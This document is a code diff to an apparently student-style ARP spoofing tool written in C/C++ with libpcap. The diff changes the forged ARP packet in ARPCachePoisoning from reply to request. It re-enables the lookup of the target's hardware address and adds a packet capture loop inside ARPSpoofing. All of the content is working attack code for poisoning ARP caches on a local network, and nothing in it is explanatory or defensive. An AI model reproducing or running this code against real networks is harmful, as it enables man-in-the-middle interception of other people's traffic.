@@ -14,7 +14,7 @@ bool ARPCachePoisoning(pcap_t *handle, const HWaddr sha, const IPaddr sip, const
 {
     ARPpkt pkt;
 
-    makeARPPacket(&pkt, aha, tip, sha, sip, ARPOP_REPLY);
+    makeARPPacket(&pkt, aha, tip, sha, sip, ARPOP_REQUEST);
     if(pcap_sendpacket(handle, (u_char *)&pkt, sizeof(pkt)) != 0)
     {
         LOG(FATAL) << "pcap_sendpacket : failed";
@@ -29,6 +29,10 @@ void *ARPSpoofing(void *)
     HWaddr sha, tha;
     pcap_t *handle;
     char errbuf[PCAP_ERRBUF_SIZE];
+    int res;
+    struct ether_header *eth_hdr;
+    struct pcap_pkthdr      *header;
+    const u_char            *pkt;
 
     pthread_mutex_lock(&mutex);
     sip = sender_ip[thread_idx];
@@ -47,26 +51,40 @@ void *ARPSpoofing(void *)
     if(!getHWaddrByIPaddr(&sha, handle, attacker_ha, attacker_ip, sip))
     {
         LOG(FATAL) << "getHWaddrbyIPaddr : failed";
-        return NULL;
+        exit(-1);
     }
-/*
+
     LOG(INFO) << "getHWaddrbyIPaddr(target)";
     if(!getHWaddrByIPaddr(&tha, handle, attacker_ha, attacker_ip, tip))
     {
         LOG(FATAL) << "getHWaddrbyIPaddr : failed";
-        return (void *)-1;
+        exit(-1);
     }
-*/
+
     if(!ARPCachePoisoning(handle, sha, sip, attacker_ha, tip))
     {
         LOG(FATAL) << "ARPCachePoisoning : failed";
-        return NULL;
+        exit(-1);
     }
 
     while(isSpoofing)
     {
-        
+        res = pcap_next_ex(handle, &header, &pkt);
+
+        if(res == 0)
+        {
+            LOG(INFO) << "timeout";
+            continue;
+        }
+
+        if(res < 0)
+        {
+            LOG(FATAL) << "pcap_next_ex : failed";
+            exit(-1);
+        }
     }
+
+    pcap_close(handle);
 
     pthread_exit(NULL);
 }
